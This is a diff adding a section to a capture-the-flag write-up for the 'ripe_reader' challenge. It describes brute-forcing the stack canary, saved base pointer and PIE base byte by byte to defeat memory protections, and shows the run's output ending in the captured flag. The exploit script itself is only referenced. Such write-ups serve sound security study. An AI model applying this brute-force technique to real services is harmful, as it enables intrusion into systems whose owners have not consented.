@@ -288,3 +288,59 @@ sys 0m0.923s
 
 Times of other runs: _15m50.392s_, _12m27.560s_, _10m52.456s_
 
+
+## But... what if `./flag.txt` was not in the binary?
+
+In that case, we'd have to leak a stack address and then put `./flag.txt` on the stack.  See [exploit2.py](exploit2.py) for an implementation.
+
+There were a few challenges with leaking the saved base pointer (rdp):
+
+1. Brute-forcing _what-will-be-popped_ into `rdp` on `leave` may not fail as quickly as brute-forcing the canary or return address.  In the later cases the connection is dropped quickly, for a quicker check.  Post `pop rdp` with a corrupted `rdp` may not crash the program.  A timeout may need to be used to detect failure.
+2. The length of the timeout.  Locally 0.1 seconds worked consistently.  Remotely with 0.5 seconds only 1 of 3 tests passed.
+3. Many `ripe_reader` runaway processes is a byproduct of this bruce-force, slowing down the challenge server.
+
+There's one last issue that I've not had the time to analyze yet.  The distance from stack leak (rbp) to the start of the input buffer is either 68 or 176 depending on the value of the least sigificant nibble; if `0`, then the distance is 176, otherwise 68.  IIRC, the nibble was either `0` or `4`, I do not recall, in any tests, any other value.  Checking all my results, the probably of a `0` was 75%.
+
+Output:
+
+```
+# time ./exploit2.py two.jh2i.com 50023
+[*] '/pwd/datajerk/nahamconctf2020/ripe_reader/ripe_reader'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+0x6600
+0xbb6600
+0xe5bb6600
+0x59e5bb6600
+0x3c59e5bb6600
+0x283c59e5bb6600
+0x8b283c59e5bb6600
+canary 0x8b283c59e5bb6600
+0x30
+0xb530
+0xdbb530
+0x24dbb530
+0xfe24dbb530
+0x7ffe24dbb530
+rbp 0x7ffe24dbb530
+0xe06
+0x1e06
+procbase | 0xffff 0x1e06
+0xfc1e06
+0x5afc1e06
+0x605afc1e06
+0x55605afc1e06
+procbase 0x55605afc1000
+buf 0x7ffe24dbb480
+[+] Opening connection to two.jh2i.com on port 50023: Done
+
+Invalid option!
+flag{should_make_an_ascii_flag_image}
+
+real	27m25.714s
+user	0m4.633s
+sys	0m1.342s
+```
